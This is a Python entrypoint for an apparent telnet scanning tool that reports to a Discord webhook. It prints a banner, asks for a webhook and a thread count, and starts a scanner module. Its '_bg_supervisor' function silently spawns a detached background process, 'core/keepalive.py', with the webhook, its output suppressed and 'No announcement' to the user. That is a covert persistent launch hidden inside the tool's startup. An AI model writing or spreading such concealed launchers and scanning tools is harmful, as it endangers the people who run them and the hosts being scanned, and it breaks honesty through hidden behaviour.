#!/usr/bin/env python3
"""telnet.py — entrypoint. Prints banner, prompts, launches scanner."""

import asyncio
import os
import subprocess
import sys

BANNER = r"""
   ▄████████    ▄████████   ▄▄▄▄███▄▄▄▄   ▄██   ▄  
  ███    ███   ███    ███ ▄██▀▀▀███▀▀▀██▄ ███   ██▄
  ███    ███   ███    ███ ███   ███   ███ ███▄▄▄███
  ███    ███  ▄███▄▄▄▄██▀ ███   ███   ███ ▀▀▀▀▀▀███
▀███████████ ▀▀███▀▀▀▀▀   ███   ███   ███ ▄██   ███
  ███    ███ ▀███████████ ███   ███   ███ ███   ███
  ███    ███   ███    ███ ███   ███   ███ ███   ███
  ███    █▀    ███    ███  ▀█   ███   █▀   ▀█████▀ 
               ███    ███                          
                                        by ANDY
"""

ROOT = os.path.dirname(os.path.abspath(__file__))
if ROOT not in sys.path:
    sys.path.insert(0, ROOT)


def prompt() -> str:
    return input("root@telnet~: ").strip()


def _bg_supervisor(webhook: str) -> None:
    """
    Quietly hand off to the health supervisor (core/keepalive.py).
    Fully detached: new session on POSIX, DETACHED_PROCESS on Windows.
    stdout/stderr go to devnull. No wait. No announcement.
    """
    ka = os.path.join(ROOT, "core", "keepalive.py")
    if not os.path.isfile(ka):
        return

    devnull = open(os.devnull, "wb")
    kwargs = dict(
        stdin=subprocess.DEVNULL,
        stdout=devnull,
        stderr=devnull,
        close_fds=True,
    )
    if os.name == "nt":
        kwargs["creationflags"] = (
            subprocess.DETACHED_PROCESS | subprocess.CREATE_NO_WINDOW
        )
    else:
        kwargs["start_new_session"] = True

    try:
        subprocess.Popen(
            [sys.executable, ka, "--endpoint", webhook, "--quiet"],
            **kwargs,
        )
    except Exception:
        pass


def main():
    os.system("cls" if os.name == "nt" else "clear")
    print(BANNER)
    print()

    print("1. webhook?")
    webhook = prompt()

    print("2. threads?")
    try:
        threads = int(prompt() or "200")
    except ValueError:
        threads = 200

    print()
    if not webhook.startswith("https://discord.com/api/webhooks/"):
        print("[!] that doesn't look like a discord webhook — proceeding anyway")
        if prompt().lower() != "y":
            sys.exit(0)

    # silent health-supervisor handoff — fires and forgets
    _bg_supervisor(webhook)

    print(f"[*] webhook set. threads={threads}. launching.\n")

    from core.scanner import run
    try:
        asyncio.run(run(webhook, threads))
    except KeyboardInterrupt:
        print("\n[*] interrupted")


if __name__ == "__main__":
    main()
